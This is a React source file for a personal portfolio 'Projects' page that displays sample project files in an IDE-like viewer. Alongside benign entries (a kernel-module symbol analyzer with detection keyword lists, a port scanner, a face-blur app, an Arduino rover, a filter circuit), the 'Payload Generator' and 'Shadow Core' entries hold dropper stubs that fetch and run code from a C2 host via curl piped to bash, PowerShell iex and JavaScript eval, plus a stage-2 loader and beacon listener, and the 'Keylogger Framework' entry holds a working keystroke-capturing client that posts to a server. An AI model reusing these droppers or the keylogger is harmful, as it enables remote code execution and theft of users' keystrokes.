import { createFileRoute } from "@tanstack/react-router";
import { useEffect, useMemo, useRef, useState } from "react";
import { motion, AnimatePresence } from "framer-motion";
import { Reveal } from "@/components/Reveal";
import {
  Folder, FolderOpen, FileCode2, FileText, FileTerminal, ChevronRight, X,
  Play, Square as Stop, Search, Lock, ExternalLink, Github,
  Activity, TerminalSquare, Tag, Cpu, Network as NetIcon, Bug, ChevronDown, Menu,
} from "lucide-react";
import { cn } from "@/lib/utils";

export const Route = createFileRoute("/projects")({
  head: () => ({
    meta: [
      { title: "Projects — Mostafa Galal" },
      { name: "description", content: "Interactive engineering workspace — explore Mostafa Galal's security tooling, embedded systems, and analog projects like a real IDE." },
      { property: "og:title", content: "Projects — Mostafa Galal" },
      { property: "og:description", content: "An IDE-style workspace of security tooling, embedded systems, and analog projects." },
    ],
  }),
  component: ProjectsPage,
});

type FileEntry = {
  name: string;
  lang: "md" | "py" | "js" | "bash" | "c" | "ino" | "txt";
  content: string;
};

type Project = {
  id: string;
  name: string;
  domain: "security" | "embedded" | "ai" | "networking";
  status: "active" | "archived" | "in-progress" | "private";
  tags: string[];
  description: string;
  github: string;
  demo: string;
  image: string | null;
  files: FileEntry[];
  runCommand: string;
  runOutput: string[];
  vulnLines?: number[];
};

const PROJECTS: Project[] = [
  {
    id: "nm",
    name: "NM Analyzer",
    domain: "security",
    status: "active",
    tags: ["reversing", "elf", "kernel", "static-analysis"],
    description: "Static analysis tool for Linux Kernel Modules using symbol table heuristics to detect malicious patterns.",
    github: "",
    demo: "/assets/nm.mp4",
    image: "/assets/nm_analyzer.png",
    runCommand: "$ python3 NM-Analyzer.py rootkit.ko",
    runOutput: [
      "[*] Analyzing: rootkit.ko",
      "[T]  87 symbols  Text (Global Code)",
      "[t]  12 symbols  Text (Local Code)",
      "[U]  34 symbols  Undefined (Imported)",
      "[B]   8 symbols  BSS (Global Uninit)",
      "",
      "▶ Privilege Escalation (3)",
      "  T  commit_creds",
      "  T  prepare_kernel_cred",
      "  U  setresuid",
      "",
      "▶ Syscall Hooking (2)",
      "  T  sys_call_table",
      "  U  ftrace_set_filter_ip",
      "",
      "Score: 10/10",
      "Status: HIGH RISK - Potential Rootkit or Malicious Agent.",
      "[+] Analysis complete. JSON report: nm_analysis.json",
    ],
    vulnLines: [22, 23, 35],
    files: [
      {
        name: "README.md",
        lang: "md",
        content: `# NM Analyzer

Static analysis for Linux Kernel Modules (.ko) using symbol-table heuristics.

## Why
LKM rootkits are notoriously hard to spot. Most evade dynamic analysis but still
need *symbols* the kernel can resolve. NM Analyzer parses the ELF symbol table
and bins each symbol into risk categories.

## Categories
- **Syscall Hooking**     — sys_call_table, set_memory_rw, …
- **Privilege Escalation** — commit_creds, prepare_kernel_cred
- **Hiding**               — module_kobject removal, dirent filtering

## Usage
\`\`\`
python3 NM-Analyzer.py module.ko
\`\`\`

## Status
Active · adding YARA-style rule packs next.
`,
      },
      {
        name: "NM-Analyzer.py",
        lang: "py",
        content: `
#!/usr/bin/env python3
import subprocess
import sys
import json
import os
from collections import defaultdict

# --- Configuration & Aesthetics ---
class Colors:
    HEADER = '\\033[95m'
    BLUE = '\\033[94m'
    CYAN = '\\033[96m'
    GREEN = '\\033[92m'
    YELLOW = '\\033[93m'
    RED = '\\033[91m'
    BOLD = '\\033[1m'
    UNDERLINE = '\\033[4m'
    ENDC = '\\033[0m'

# Expanded Keyword Dictionary for Kernel Malware Analysis
KEYWORDS = {
    "Privilege_Escalation": ["cred", "root", "commit", "prepare", "uid", "gid", "setresuid", "override_creds"],
    "Syscall_Hooking": ["kill", "getdents", "syscall", "hook", "table", "wp_disable", "cr0", "ftrace", "kprobe"],
    "Stealth_Persistence": ["hide", "invisible", "module", "obfuscate", "cloak", "unhash", "list_del", "notifier_chain"],
    "Kernel_Interaction": ["task", "current", "kthread", "vm_area", "notify", "workqueue", "kobject"],
    "Network_Operations": ["socket", "packet", "netif", "skb", "tcp", "udp", "dev_add_pack", "nf_register", "iptables"],
    "File_Manipulation": ["vfs_", "file_operations", "read_iter", "write_iter", "lookup", "inode", "dentry"],
    "Memory_Manipulation": ["mmap", "vmalloc", "kmem_cache", "page_alloc", "copy_from_user", "copy_to_user", "remap_pfn"],
    "Security_Bypass": ["selinux", "apparmor", "capability", "audit", "lsm", "security_ops"],
    "Encryption_Hashing": ["crypto_", "aes", "sha256", "md5", "des", "encrypt", "decrypt"]
}

def print_banner():
    print(f"{Colors.BLUE}{Colors.BOLD}")
    print(r"  _   _ __  __      _                _                      ")
    print(r" | \\ | |  \\/  |    / \\   _ __   __ _| |_   _ _______ _ __   ")
    print(r" |  \\| | |\\/| |   / _ \\ | '_ \\ / _\` | | | | |_  / _ \\ '__|  ")
    print(r" | |\\  | |  | |  / ___ \\| | | | (_| | | |_| |/ /  __/ |     ")
    print(r" |_| \\_|_|  |_| /_/   \\_\\_| |_|\\__,_|_|\\__, /___\\___|_|     ")
    print(r"                                       |___/                ")
    print(f"{Colors.ENDC}")

def analyze_binary(binary_path):
    if not os.path.exists(binary_path):
        print(f"{Colors.RED}[!] Error: File '{binary_path}' not found.{Colors.ENDC}")
        sys.exit(1)

    try:
        output = subprocess.check_output(["nm", binary_path], text=True, stderr=subprocess.DEVNULL)
    except subprocess.CalledProcessError:
        print(f"{Colors.RED}[!] Error: 'nm' failed to process the binary.{Colors.ENDC}")
        sys.exit(1)

    symbols = []
    by_type = defaultdict(list)
    semantic = defaultdict(list)

    for line in output.splitlines():
        parts = line.split()
        if len(parts) < 2: continue
        
        if len(parts) == 2:
            addr, sym_type, name = "        ", parts[0], parts[1]
        else:
            addr, sym_type, name = parts[0], parts[1], parts[2]

        entry = {"address": addr, "type": sym_type, "name": name}
        symbols.append(entry)
        by_type[sym_type].append(entry)

        lname = name.lower()
        for category, keys in KEYWORDS.items():
            if any(k in lname for k in keys):
                semantic[category].append(entry)

    return symbols, by_type, semantic

def main():
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <kernel_module.ko>")
        sys.exit(1)

    binary = sys.argv[1]
    print_banner()
    print(f"{Colors.CYAN}Analyzing: {Colors.BOLD}{binary}{Colors.ENDC}\\n")

    symbols, by_type, semantic = analyze_binary(binary)

    # 1. Symbol Summary
    print(f"{Colors.HEADER}{Colors.BOLD}─── SYMBOL TYPE SUMMARY ─────────────────────────────────{Colors.ENDC}")
    sorted_types = sorted(by_type.items(), key=lambda x: len(x[1]), reverse=True)
    for t, syms in sorted_types:
        desc = {
            'T': 'Text (Global Code)', 't': 'Text (Local Code)', 'U': 'Undefined (Imported)', 
            'B': 'BSS (Global Uninit)', 'b': 'BSS (Local Uninit)', 'D': 'Data (Global Init)',
            'd': 'Data (Local Init)', 'r': 'Read-Only (Constants)'
        }.get(t, 'Unknown')
        print(f"  {Colors.BOLD}[{t}]{Colors.ENDC} {len(syms):<4} symbols  {Colors.BLUE}({desc}){Colors.ENDC}")

    # 2. Semantic Analysis
    print(f"\\n{Colors.HEADER}{Colors.BOLD}─── SEMANTIC HEURISTICS ────────────────────────────────{Colors.ENDC}")
    for cat, items in semantic.items():
        count = len(items)
        cat_color = Colors.RED if count > 0 else Colors.GREEN
        print(f"\\n{cat_color}▶ {cat.replace('_', ' ')} ({count}){Colors.ENDC}")
        for s in items:
            # Highlight external imports and executable code
            sym_color = Colors.YELLOW if s['type'] in ['T', 't'] else (Colors.CYAN if s['type'] == 'U' else Colors.ENDC)
            print(f"  {Colors.BOLD}{s['type']:>2}{Colors.ENDC}  {sym_color}{s['name']}{Colors.ENDC}")

    # 3. Risk Assessment (Weighted Logic)
    risk_score = 0
    findings = []
    
    weights = {
        "Privilege_Escalation": 4,
        "Syscall_Hooking": 4,
        "Stealth_Persistence": 3,
        "Security_Bypass": 3,
        "Network_Operations": 2,
        "Memory_Manipulation": 2,
        "Encryption_Hashing": 1
    }

    for cat, weight in weights.items():
        if semantic.get(cat):
            risk_score += weight
            findings.append(f"{cat.replace('_', ' ')} logic detected.")
    
    risk_score = min(risk_score, 10)

    print(f"\\n{Colors.HEADER}{Colors.BOLD}─── RISK ASSESSMENT ────────────────────────────────────{Colors.ENDC}")
    score_color = Colors.GREEN if risk_score < 4 else (Colors.YELLOW if risk_score < 7 else Colors.RED)
    
    print(f"  Score: {score_color}{Colors.BOLD}{risk_score}/10{Colors.ENDC}")
    
    if risk_score >= 7:
        print(f"  {Colors.RED}{Colors.BOLD}Status: HIGH RISK - Potential Rootkit or Malicious Agent.{Colors.ENDC}")
    elif risk_score >= 4:
        print(f"  {Colors.YELLOW}Status: MEDIUM RISK - Suspicious capability overlap.{Colors.ENDC}")
    else:
        print(f"  {Colors.GREEN}Status: LOW RISK - Standard or benign module activity.{Colors.ENDC}")

    # 4. JSON Export
    report = {
        "target": binary,
        "metrics": {
            "total_symbols": len(symbols),
            "risk_score": risk_score,
            "findings": findings
        },
        "symbol_counts": {k: len(v) for k, v in by_type.items()},
        "detections": {k: [s["name"] for s in v] for k, v in semantic.items()}
    }

    output_file = "nm_analysis.json"
    with open(output_file, "w") as f:
        json.dump(report, f, indent=4)
    
    print(f"\\n{Colors.CYAN}[+] Analysis complete. JSON report: {Colors.BOLD}{output_file}{Colors.ENDC}")

if __name__ == "__main__":
    main()
,
      },
      {
        name: "rules.json",
        lang: "txt",
        content: `{
  "syscall_hooking": ["sys_call_table","set_memory_rw"],
  "privesc": ["commit_creds","prepare_kernel_cred"],
  "hiding": ["module_kobject"]
}`,
      },
    ],
  },
  {
    id: "shadow",
    name: "Shadow Core",
    domain: "security",
    status: "private",
    tags: ["framework", "post-exploitation", "private", "staged-delivery"],
    description: "Modular core framework for staged payload delivery and controlled listener orchestration.",
    github: "",
    demo: "",
    image: null,
    runCommand: "$ shadowctl status",
    runOutput: [
      "[!] CLASSIFIED — operator credentials required.",
      "[*] redacted ████████████████████",
      "[*] redacted ████████████████████",
      "[*] redacted ████████████████████",
      "[*] handshake denied · access lvl: PUBLIC",
    ],
    files: [
      {
        name: "README.md",
        lang: "md",
        content: `# Shadow Core Framework  ·  CLASSIFIED

Modular framework for staged payload delivery and listener orchestration.

> **NOTICE** — Source and docs are not published. This card exists to record
> the engineering effort. Reach out for a private walkthrough.

## High-level
- Configuration-driven module graph
- Multi-stage delivery (loader → stub → payload)
- Pluggable transports
- Operator audit log

## Tree
\`\`\`
.
├── config.json
├── deploy.sh
├── key.txt
├── listener
│   └── root_listener.py
└── public_html
    ├── index.html
    ├── payload.bin
    ├── stage2.ps1
    └── update.js
\`\`\`

Status: Private.
`,
      },
      {
        name: "config.json",
        lang: "txt",
        content: `{
  "listener_port": 8443,
  "staging": true,
  "transport": "https",
  "beacon_interval": 30
}`,
      },
      {
        name: "deploy.sh",
        lang: "bash",
        content: `#!/bin/bash
# Shadow Core deploy script
set -e
echo "[*] Deploying Shadow Core..."
chmod +x listener/root_listener.py
nohup python3 listener/root_listener.py &
echo "[+] Listener active on port 8443"`,
      },
      {
        name: "key.txt",
        lang: "txt",
        content: `-----BEGIN OPENSSH PRIVATE KEY-----
[REDACTED]
-----END OPENSSH PRIVATE KEY-----`,
      },
      {
        name: "listener/root_listener.py",
        lang: "py",
        content: `#!/usr/bin/env python3
"""Shadow Core — root listener"""
import socket, threading, json

HOST, PORT = "0.0.0.0", 8443

def handle_client(conn, addr):
    print(f"[+] Beacon from {addr}")
    while True:
        data = conn.recv(4096)
        if not data:
            break
        print(f"[*] {data.decode(errors='ignore')}")
    conn.close()

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((HOST, PORT))
    s.listen(5)
    print(f"[*] Listening on {HOST}:{PORT}")
    while True:
        conn, addr = s.accept()
        threading.Thread(target=handle_client, args=(conn, addr)).start()
`,
      },
      {
        name: "public_html/index.html",
        lang: "txt",
        content: `<!DOCTYPE html>
<html>
<head><title>Loading...</title></head>
<body>
<script src="update.js"></script>
</body>
</html>`,
      },
      {
        name: "public_html/stage2.ps1",
        lang: "txt",
        content: `# Stage-2 loader
$wc = New-Object System.Net.WebClient
$payload = $wc.DownloadData("https://cdn.example.com/payload.bin")
# [REDACTED execution chain]`,
      },
      {
        name: "public_html/update.js",
        lang: "js",
        content: `// Staging bootstrap
fetch('/payload.bin')
  .then(r => r.arrayBuffer())
  .then(buf => {
    // [REDACTED]
  });`,
      },
    ],
  },
  {
    id: "payload",
    name: "Payload Generator",
    domain: "security",
    status: "private",
    tags: ["research", "private", "cross-platform", "obfuscation"],
    description: "Multi-platform payload research toolkit for studying delivery mechanisms and obfuscation.",
    github: "",
    demo: "",
    image: null,
    runCommand: "$ python3 payload_generator.py --list",
    runOutput: [
      "[*] Payload Generator v2.1",
      "[*] Available formats:",
      "    [1] windows.payload   — PowerShell dropper",
      "    [2] linux.payload     — ELF stub",
      "    [3] macos.payload     — Mach-O bundle",
      "    [4] python.payload    — PyInstaller",
      "    [5] javascript.payload— Electron wrapper",
      "    [6] powershell.payload— AMSI bypass",
      "[*] Use --format <id> --output <path>",
    ],
    files: [
      {
        name: "README.md",
        lang: "md",
        content: `# Payload Generator  ·  CLASSIFIED

Researches payload formats across OSes — generation, lightweight obfuscation,
delivery simulation, and listener-side handling for controlled lab environments.

## Tree
\`\`\`
.
├── index.html
├── payload.js
├── payload.obf.js
├── payload_generator.py
├── payloads
│   ├── javascript.payload
│   ├── linux.payload
│   ├── macos.payload
│   ├── powershell.payload
│   ├── python.payload
│   └── windows.payload
└── root_listener.py
\`\`\`

> Source not published. Lab use only.
`,
      },
      {
        name: "payload_generator.py",
        lang: "py",
        content: `#!/usr/bin/env python3
"""Payload Generator — multi-format research toolkit"""
import argparse, os, base64
from pathlib import Path

PAYLOADS = Path("payloads")

FORMATS = {
    "windows":   ("windows.payload",   "ps1"),
    "linux":     ("linux.payload",     "sh"),
    "macos":     ("macos.payload",     "command"),
    "python":    ("python.payload",    "py"),
    "javascript":("javascript.payload","js"),
    "powershell":("powershell.payload","ps1"),
}

def generate(fmt, output):
    src, ext = FORMATS[fmt]
    raw = (PAYLOADS / src).read_bytes()
    b64 = base64.b64encode(raw).decode()
    stub = f"# Auto-generated {fmt} payload\n"
    stub += f"import base64\nexec(base64.b64decode('{b64}'))\n"
    Path(f"{output}.{ext}").write_text(stub)
    print(f"[+] Generated {output}.{ext} ({len(stub)} bytes)")

def main():
    p = argparse.ArgumentParser()
    p.add_argument("--list", action="store_true")
    p.add_argument("--format", choices=list(FORMATS.keys()))
    p.add_argument("--output", default="out")
    args = p.parse_args()
    if args.list:
        for k in FORMATS:
            print(f"  [+] {k}")
    elif args.format:
        generate(args.format, args.output)

if __name__ == "__main__":
    main()
`,
      },
      {
        name: "payload.js",
        lang: "js",
        content: `// Payload delivery stub
const net = require('net');
const fs = require('fs');

const client = net.createConnection({ port: 4444, host: '127.0.0.1' }, () => {
  console.log('[*] Connected to listener');
});

client.on('data', (data) => {
  fs.writeFileSync('/tmp/stage2.bin', data);
  // [REDACTED]
});
`,
      },
      {
        name: "payload.obf.js",
        lang: "js",
        content: `eval(function(p,a,c,k,e,d){e=function(c){return c};
if(!''.replace(/^/,String)){while(c--){d[c]=k[c]||c}k=[function(e){return d[e]}];
e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0 1=2;0 3=4;',5,5,'var|a|1|b|2'.split('|'),0,{}))
`,
      },
      {
        name: "root_listener.py",
        lang: "py",
        content: `#!/usr/bin/env python3
"""Root listener for generated payloads"""
import socket, threading

PORT = 4444

def handler(c, a):
    print(f"[+] Connection from {a}")
    c.send(b"\x00\x01\x02\x03")
    c.close()

with socket.socket() as s:
    s.bind(("0.0.0.0", PORT))
    s.listen(5)
    print(f"[*] Listening on port {PORT}")
    while True:
        conn, addr = s.accept()
        threading.Thread(target=handler, args=(conn, addr)).start()
`,
      },
      {
        name: "payloads/windows.payload",
        lang: "txt",
        content: `# Windows dropper stub
# Downloads stage-2 from C2 and executes via rundll32
$wc = New-Object System.Net.WebClient
$data = $wc.DownloadString("http://c2/stage2")
iex $data`,
      },
      {
        name: "payloads/linux.payload",
        lang: "txt",
        content: `#!/bin/bash
# Linux ELF stub
curl -s http://c2/stage2 | bash`,
      },
      {
        name: "payloads/macos.payload",
        lang: "txt",
        content: `#!/bin/bash
# macOS bundle stub
curl -s http://c2/stage2 | bash`,
      },
      {
        name: "payloads/python.payload",
        lang: "txt",
        content: `import urllib.request, subprocess
url = "http://c2/stage2"
data = urllib.request.urlopen(url).read()
# [REDACTED]`,
      },
      {
        name: "payloads/javascript.payload",
        lang: "txt",
        content: `fetch("http://c2/stage2")
  .then(r => r.text())
  .then(t => eval(t));`,
      },
      {
        name: "payloads/powershell.payload",
        lang: "txt",
        content: `$a = [Ref].Assembly.GetTypes() | Where-Object { $_.Name -like "*iUtils" }
# [REDACTED AMSI bypass chain]`,
      },
    ],
  },
  {
    id: "telemetry",
    name: "Keylogger Framework",
    domain: "security",
    status: "archived",
    tags: ["keylogger", "client-server", "research", "telemetry"],
    description: "Client-server telemetry framework for capturing and analyzing user input patterns in controlled environments.",
    github: "",
    demo: "",
    image: "/assets/keylogg.png",
    runCommand: "$ python3 server.py --port 9001",
    runOutput: [
      "[*] Keylogger server v1.0",
      "[*] Listening on 0.0.0.0:9001",
      "[+] Client connected: 192.168.1.42",
      "[+] Frame 0001 received  (216 B)",
      "[+] Frame 0002 received  (188 B)",
      "[*] Logging to logs/http_1d355b50-64eb-43f2-851a-55bfb62061f1.json",
    ],
    files: [
      {
        name: "README.md",
        lang: "md",
        content: `# Keylogger Framework

Client-server tool exploring how endpoint telemetry travels and what patterns
can be extracted from raw input streams. **Lab-only.**

## Tree
\`\`\`
.
├── keylogger.py
├── logs
│   ├── http_1d355b50-64eb-43f2-851a-55bfb62061f1.json
│   ├── http_1d3bc93a-f4ad-4364-8b45-ba37e58f9489.json
│   ├── http_2d99935f-cb1f-48ff-b95a-a62f00166366.json
│   └── http_d3f5bf9d-8697-480b-9d95-10af4b0ab580.json
└── server.py
\`\`\`
`,
      },
      {
        name: "keylogger.py",
        lang: "py",
        content: `
#!/usr/bin/env python3
"""Keylogger client — sends keystroke telemetry to server"""
import keyboard, json, requests, threading, time
from datetime import datetime

SERVER = "http://127.0.0.1:9001"
BUFFER = []

def flush():
    if not BUFFER:
        return
    payload = {
        "timestamp": datetime.now().isoformat(),
        "keys": BUFFER.copy(),
        "session": "default"
    }
    try:
        requests.post(SERVER, json=payload, timeout=3)
    except Exception as e:
        print(f"[!] Send failed: {e}")
    BUFFER.clear()

def on_key(event):
    BUFFER.append({"key": event.name, "time": time.time()})
    if len(BUFFER) >= 20:
        flush()

keyboard.on_press(on_key)
threading.Timer(5.0, flush).start()
print("[*] Keylogger active — press Ctrl+C to stop")
keyboard.wait()
,
      },
      {
        name: "server.py",
        lang: "py",
        content: `#!/usr/bin/env python3
"""Keylogger server — receives and stores telemetry frames"""
import socket, json, uuid, os
from datetime import datetime
from pathlib import Path

HOST, PORT = "0.0.0.0", 9001
LOG_DIR = Path("logs")
LOG_DIR.mkdir(exist_ok=True)

def save_frame(data: bytes):
    uid = str(uuid.uuid4())
    path = LOG_DIR / f"http_{uid}.json"
    try:
        payload = json.loads(data.decode())
        payload["server_time"] = datetime.now().isoformat()
        path.write_text(json.dumps(payload, indent=2))
        print(f"[+] Saved frame → {path.name}")
    except Exception as e:
        print(f"[!] Parse error: {e}")

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((HOST, PORT))
    s.listen(5)
    print(f"[*] Listening on {HOST}:{PORT}")
    while True:
        conn, addr = s.accept()
        print(f"[+] Client connected: {addr[0]}")
        with conn:
            while True:
                data = conn.recv(4096)
                if not data:
                    break
                save_frame(data)
`,
      },
      {
        name: "logs/http_1d355b50-64eb-43f2-851a-55bfb62061f1.json",
        lang: "txt",
        content: `{
  "timestamp": "2025-04-23T14:22:01",
  "keys": [
    {"key": "h", "time": 1713882121.0},
    {"key": "e", "time": 1713882121.1},
    {"key": "l", "time": 1713882121.2},
    {"key": "l", "time": 1713882121.3},
    {"key": "o", "time": 1713882121.4}
  ],
  "session": "default",
  "server_time": "2025-04-23T14:22:02"
}`,
      },
      {
        name: "logs/http_1d3bc93a-f4ad-4364-8b45-ba37e58f9489.json",
        lang: "txt",
        content: `{
  "timestamp": "2025-04-23T14:25:33",
  "keys": [
    {"key": "t", "time": 1713882333.0},
    {"key": "e", "time": 1713882333.1},
    {"key": "s", "time": 1713882333.2},
    {"key": "t", "time": 1713882333.3}
  ],
  "session": "default",
  "server_time": "2025-04-23T14:25:34"
}`,
      },
      {
        name: "logs/http_2d99935f-cb1f-48ff-b95a-a62f00166366.json",
        lang: "txt",
        content: `{
  "timestamp": "2025-04-23T14:28:12",
  "keys": [
    {"key": "ctrl", "time": 1713882492.0},
    {"key": "c", "time": 1713882492.1}
  ],
  "session": "default",
  "server_time": "2025-04-23T14:28:13"
}`,
      },
      {
        name: "logs/http_d3f5bf9d-8697-480b-9d95-10af4b0ab580.json",
        lang: "txt",
        content: `{
  "timestamp": "2025-04-23T14:30:45",
  "keys": [
    {"key": "enter", "time": 1713882645.0}
  ],
  "session": "default",
  "server_time": "2025-04-23T14:30:46"
}`,
      },
    ],
  },
  {
    id: "tcp",
    name: "TCP Full Scan Tool",
    domain: "networking",
    status: "active",
    tags: ["networking", "scanner", "python"],
    description: "Custom TCP-based network scanning tool for analyzing exposed services and port states.",
    github: "",
    demo: "/assets/tcp_full_scan.mp4",
    image: "/assets/tcp_full_scan.png",
    runCommand: "$ python3 tcp_scan.py 10.0.0.5 1-1024",
    runOutput: [
      "[*] Target: 10.0.0.5  ports 1-1024",
      "[*] Threads: 200  timeout: 1.0s",
      "[+] 22/tcp   open    ssh",
      "[+] 80/tcp   open    http",
      "[+] 443/tcp  open    https",
      "[+] 3306/tcp open    mysql",
      "[*] Scan complete in 4.2s — 4 open / 1020 filtered",
    ],
    files: [
      {
        name: "README.md",
        lang: "md",
        content: `# TCP Full Scan

Threaded TCP full-connect scanner. Built to learn the wire — no nmap.

## Usage
\`\`\`
python3 tcp_scan.py <target> <start-end>
\`\`\`

Demonstrates:
- raw socket connect()
- thread-pool concurrency
- timeout / banner grabbing
`,
      },
      {
        name: "tcp_scan.py",
        lang: "py",
        content: `import socket, sys
from concurrent.futures import ThreadPoolExecutor

def probe(host, port, timeout=1.0):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    try:
        s.connect((host, port))
        try: banner = s.recv(64).decode(errors="ignore").strip()
        except Exception: banner = ""
        return port, True, banner
    except Exception:
        return port, False, ""
    finally:
        s.close()

def main(host, lo, hi):
    open_ports = []
    with ThreadPoolExecutor(max_workers=200) as ex:
        for port, ok, banner in ex.map(lambda p: probe(host, p), range(lo, hi+1)):
            if ok:
                open_ports.append((port, banner))
                print(f"[+] {port}/tcp open  {banner}")
    print(f"[*] {len(open_ports)} open")

if __name__ == "__main__":
    host = sys.argv[1]
    lo, hi = map(int, sys.argv[2].split("-"))
    main(host, lo, hi)
`,
      },
    ],
  },
  {
    id: "faceblur",
    name: "FaceBlur Live",
    domain: "ai",
    status: "active",
    tags: ["computer-vision", "opencv", "real-time", "mediapipe"],
    description: "Real-time computer vision app detecting and blurring faces in live video streams with audio recording.",
    github: "",
    demo: "/assets/livefaceblur.mp4",
    image: "/assets/livefaceblur.png",
    runCommand: "$ python3 face-blur.py",
    runOutput: [
      "🎙️ Recording audio...",
      "🎥 Recording video... Press 'q' to stop.",
      "🎙️ Processing audio...",
      "📦 Merging video + audio...",
      "✅ Done! Output saved to final_output.mp4",
    ],
    files: [
      {
        name: "README.md",
        lang: "md",
        content: `# FaceBlur Live

Real-time face detection + dynamic blurring on live webcam feed with audio recording.

## How
- MediaPipe face detection (fast, accurate)
- Per-frame mosaic blur over detected ROIs
- Simultaneous audio recording via sounddevice
- FFmpeg merge for final output

## Requirements
- opencv-python
- mediapipe
- sounddevice
- soundfile
- ffmpeg
`,
      },
      {
        name: "face-blur.py",
        lang: "py",
        content: `
import cv2
import mediapipe as mp
import numpy as np
import sounddevice as sd
import soundfile as sf
import threading
import subprocess
import os
import shutil

# إعداد mediapipe
mp_face = mp.solutions.face_detection
detector = mp_face.FaceDetection(model_selection=0, min_detection_confidence=0.5)

# مسارات الإخراج
video_file = "raw_video.avi"
audio_file = "raw_audio.wav"
final_file = "final_output.mp4"

# إعداد الفيديو
cap = cv2.VideoCapture(0)
fourcc = cv2.VideoWriter_fourcc(*"XVID")
out = cv2.VideoWriter(video_file, fourcc, 20.0, (640, 480))

# إعداد الصوت
audio_sr = 44100
audio_data = []

def record_audio():
    global audio_data
    print("🎙️ Recording audio...")
    audio_data = sd.rec(int(60 * audio_sr), samplerate=audio_sr, channels=1, dtype="float32")
    sd.wait()

def apply_mosaic(frame, x, y, w, h, block_size=20):
    face = frame[y:y+h, x:x+w]
    if face.size == 0:
        return frame
    small = cv2.resize(face, (w//block_size, h//block_size), interpolation=cv2.INTER_LINEAR)
    mosaic = cv2.resize(small, (w, h), interpolation=cv2.INTER_NEAREST)
    frame[y:y+h, x:x+w] = mosaic
    return frame

# بدء تسجيل الصوت في Thread منفصل
audio_thread = threading.Thread(target=record_audio, daemon=True)
audio_thread.start()

print("🎥 Recording video... Press 'q' to stop.")

while True:
    ret, frame = cap.read()
    if not ret:
        break

    rgb = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
    results = detector.process(rgb)

    if results.detections:
        for det in results.detections:
            box = det.location_data.relative_bounding_box
            h, w, _ = frame.shape
            x1 = int(box.xmin * w)
            y1 = int(box.ymin * h)
            bw = int(box.width * w)
            bh = int(box.height * h)

            # ضمان الحدود
            x1, y1 = max(0, x1), max(0, y1)
            bw, bh = min(bw, w - x1), min(bh, h - y1)

            frame = apply_mosaic(frame, x1, y1, bw, bh, block_size=15)

    out.write(frame)
    cv2.imshow("Anonymous Blur Recorder", frame)

    if cv2.waitKey(1) & 0xFF == ord("q"):
        break

cap.release()
out.release()
cv2.destroyAllWindows()

# حفظ الصوت
print("🎙️ Processing audio...")
sf.write(audio_file, audio_data, audio_sr)

anon_audio = "anon_audio.wav"
shutil.copy(audio_file, anon_audio)


# دمج الصوت بالفيديو
print("📦 Merging video + audio...")
subprocess.run([
    r"C:\\Users\\mosta\\Downloads\\ffmpeg-8.0-essentials_build\\ffmpeg-8.0-essentials_build\\bin\\ffmpeg.exe",
    "-y", "-i", video_file, "-i", anon_audio,
    "-c:v", "libx264", "-c:a", "aac", "-shortest", final_file
])

print(f"✅ Done! Output saved to {final_file}")
,
      },
    ],
  },
  {
    id: "vehicle",
    name: "Smart Recon Vehicle",
    domain: "embedded",
    status: "archived",
    tags: ["embedded", "bluetooth", "arduino"],
    description: "A smart vehicle combining embedded systems, automation, and remote Bluetooth control.",
    github: "https://github.com/youssefsalama-11/Smart-Car-Project/blob/main/Smart_Car.ino",
    demo: "",
    image: "/assets/smart.jpeg",
    runCommand: "$ avrdude -p atmega328p -U flash:w:Smart_Car.hex",
    runOutput: [
      "[*] Compiling Smart_Car.ino ...",
      "[*] AVR-GCC: OK  (program: 6,820 bytes)",
      "[*] Uploading via /dev/ttyUSB0 @ 57600",
      "[+] Flash verified ✓",
      "[*] HC-05 paired · ready for AT commands",
    ],
    files: [
      {
        name: "README.md",
        lang: "md",
        content: `# Smart Recon Vehicle

Bluetooth-controlled rover with motor-driver IC and laptop-side telemetry.

## Stack
- ATmega328P (Arduino)
- L298N motor driver, 4× DC motors
- HC-05 Bluetooth
- Serial telemetry → Python listener

## Lessons
- PWM tuning for differential drive
- Bluetooth latency vs UART throughput trade-offs
`,
      },
      {
        name: "Smart_Car.ino",
        lang: "ino",
        content: `// Smart_Car.ino — Bluetooth-controlled rover
#include <SoftwareSerial.h>

const int IN1=2, IN2=3, IN3=4, IN4=5, ENA=9, ENB=10;
SoftwareSerial bt(11, 12); // RX, TX (HC-05)

void drive(int l, int r) {
  digitalWrite(IN1, l>0); digitalWrite(IN2, l<0);
  digitalWrite(IN3, r>0); digitalWrite(IN4, r<0);
  analogWrite(ENA, abs(l));
  analogWrite(ENB, abs(r));
}

void setup() {
  pinMode(IN1, OUTPUT); pinMode(IN2, OUTPUT);
  pinMode(IN3, OUTPUT); pinMode(IN4, OUTPUT);
  bt.begin(9600); Serial.begin(9600);
}

void loop() {
  if (bt.available()) {
    char c = bt.read();
    switch (c) {
      case 'F': drive( 200,  200); break;
      case 'B': drive(-200, -200); break;
      case 'L': drive(-180,  180); break;
      case 'R': drive( 180, -180); break;
      case 'S': drive(   0,    0); break;
    }
    Serial.println(c);
  }
}
`,
      },
    ],
  },
  {
    id: "rlc",
    name: "Series RLC Band-Pass Filter",
    domain: "embedded",
    status: "archived",
    tags: ["analog", "filters", "rlc"],
    description: "Passive band-pass filter using series RLC circuit for precise frequency selection.",
    github: "",
    demo: "/assets/bandpass.mp4",
    image: "/assets/bandpass.png",
    runCommand: "$ ngspice bandpass.cir -b",
    runOutput: [
      "Circuit: Series RLC band-pass",
      "[*] AC analysis 1Hz → 10MHz",
      "  f0 = 1.59 MHz",
      "  Q  = 12.4",
      "  BW = 128 kHz",
      "[*] Pass-band ripple: 0.4 dB",
    ],
    files: [
      {
        name: "README.md",
        lang: "md",
        content: `# Series RLC Band-Pass

Passive band-pass: signals around \`f0\` pass, others attenuate.

\`\`\`
f0 = 1 / (2π√LC)
Q  = (1/R)·√(L/C)
BW = f0 / Q
\`\`\`
`,
      },
      {
        name: "bandpass.cir",
        lang: "txt",
        content: `* Series RLC band-pass filter
V1 in 0 AC 1
R1 in n1 50
L1 n1 n2 10u
C1 n2 0 1n
.AC DEC 100 1 10MEG
.PRINT AC V(n2)
.END`,
      },
    ],
  },
